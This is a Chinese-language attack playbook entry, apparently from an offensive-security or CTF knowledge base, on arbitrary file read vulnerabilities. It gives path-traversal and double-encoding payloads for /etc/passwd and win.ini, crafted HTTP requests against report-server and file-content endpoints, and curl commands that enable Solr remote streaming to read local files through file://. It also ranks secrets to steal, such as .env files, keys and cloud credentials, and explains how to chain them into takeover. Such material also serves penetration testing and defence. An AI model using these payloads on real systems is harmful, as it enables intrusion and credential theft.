---
category: web
tags: [arbitrary file read, local file read, local file disclosure, lfr, file download, file preview, export, attachment, path traversal, directory traversal, 任意文件读取, 本地文件读取, 文件下载, 文件预览, 目录遍历, 路径穿越]
triggers: [download, export, preview, attachment, filepath, file_path, filename, fileName, resource, resourcepath, doc, get_file, getfile, readfile, send_file, sendfile, createReadStream, stream.url, file://, Content-Disposition, 下载, 导出, 预览, 附件, 文件路径, 资源路径, 任意文件读取]
related: [web/lfi, web/document_report_export, web/ssrf, web/idor, web/file_upload]
---

# 任意文件读取（Arbitrary File Read）

## 什么时候用

- 接口功能本身就是下载、导出、预览、附件读取、日志查看、资源加载
- 参数名明显在传文件路径或资源名，如 `filepath`、`filename`、`resourcepath`、`path`
- 后端把用户输入拼到本地路径里，再直接读出并回显到 HTTP 响应
- 某些中间件或组件支持 `file://`、远程流、静态资源代理、日志接口、调试接口
- 题面或页面语义出现这些词时要优先考虑：`下载`、`导出`、`预览`、`附件`、`报表资源`、`日志`

## 前提条件

1. 目标存在某种“读文件然后回传”的 sink，而不是“把文件当代码执行”的 include sink
2. 输入可影响文件路径、资源路径、静态资源定位、下载目标或流式读取目标
3. 服务端没有做严格的路径归一化、基目录约束、白名单校验或协议限制

## 攻击步骤

### 1. 先识别“只读 sink”

这类漏洞的核心不是 `include/require`，而是：

- `fopen` + `fread`
- `readFile` / `createReadStream`
- `FileInputStream` / `Files.readAllBytes`
- `send_file` / `sendFile`
- 通过 `stream.url=file://...` 之类功能去读本地文件

典型例子：

```php
$file_path = '../'.$_POST['filepath'];
$fp = fopen($file_path, "r");
echo fread($fp, filesize($file_path));
```

这类 sink 的结果通常是**信息泄露**，不是直接代码执行。

### 2. 常规路径穿越与编码绕过

优先尝试：

```bash
../../../etc/passwd
..\..\..\windows\win.ini
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

同时测试解析层差异：

- 多个 `/`
- 双重编码
- 空路径片段
- 代理层和应用层规范化不一致

像这类请求就是典型的“解析逻辑导致目录穿越”：

```http
GET /%2F%2F%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: target.local
```

### 3. 把“下载/预览业务”当作高价值面

最容易出问题的并不是 `/download?file=...` 这种显眼接口，而是：

- 报表资源读取
- 日志下载
- 预览缓存
- 附件回显
- 模板 / 地图资源 / 主题资源加载

示例：

```http
GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
Host: target.local
```

或者：

```http
POST /receive_file/get_file_content.php HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

filepath=login.php
```

业务接口天然有“读文件”的正当理由，所以更容易被开发者放松警惕。

### 4. 中间件功能开关与 `file://` 协议

并不是所有任意文件读取都依赖路径穿越，很多中间件是“开启某个功能后可以指定读取源”。

典型例子是把 `stream.url` 指到本地文件：

```bash
curl -X POST \
  -H 'Content-Type: application/json' \
  --data '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' \
  http://target.local:8983/solr/demo/config

curl 'http://target.local:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

这类场景的关键词通常不是 `../`，而是：

- `file://`
- `stream.url`
- `resource`
- `dump`
- `debug`

### 5. 先读什么文件最值钱

优先级通常比 `/etc/passwd` 更重要的是：

- `.env`
- `application.properties` / `application.yml`
- 数据库配置、对象存储配置
- 平台管理员配置
- JWT / API / OAuth 密钥
- 备份压缩包、私钥、签名文件
- 编译产物和框架配置目录

现代 Web 栈里尤其要注意：

- `.next/`
- `config/`
- `secrets/`
- 日志与 heapdump
- 导出目录与临时目录

### 6. 常见成链方式

任意文件读取本身通常是“拿入口材料”，再转入其他技术：

- 读到密码或密钥 -> 登录后台、伪造 Token
- 读到数据库配置 -> 横向数据库
- 读到云凭证 -> 继续打云控制面
- 读到模板、脚本、作业定义 -> 结合文件写入或任务执行
- 读到其他用户附件或导出包 -> 进一步 IDOR / 敏感信息泄露

## 常见坑

- **把它和 LFI 混为一谈**：LFI 重点是 `include` 和解释执行；本页重点是“读文件回显”
- **只测 `../`**：很多洞在协议、功能开关、双重编码、解析差异
- **只读 `/etc/passwd`**：很多企业系统真正有价值的是配置、凭证、导出包、日志
- **忽略下载业务接口**：预览、导出、日志、资源读取常常比普通文件参数更危险
- **忽略多层路径规范化**：代理、容器、框架、应用各自的 canonicalize 可能不同

## 变体

- **路径穿越型读取**：通过 `../` 或编码绕过离开基目录
- **协议型读取**：通过 `file://`、streaming、resource loader 读取本地文件
- **调试/日志型读取**：通过日志、heapdump、调试接口读取敏感文件或敏感内存产物
- **预览/附件型读取**：借助文档预览、附件回显、报表资源读取文件

## 相关技术

- [[web/lfi]] — 如果路径最终进入 `include/require` 等执行 sink，应优先看 LFI
- [[web/document_report_export]] — 文档、报表、Office、流程系统里的文件读取高频落点
- [[web/ssrf]] — 某些读取原语来自 `stream.url`、远程资源抓取或渲染服务
- [[web/idor]] — 文件读取经常和附件 ID、导出对象、租户边界越权叠加
- [[web/file_upload]] — 只读原语常与写文件原语配合，形成完整接管链
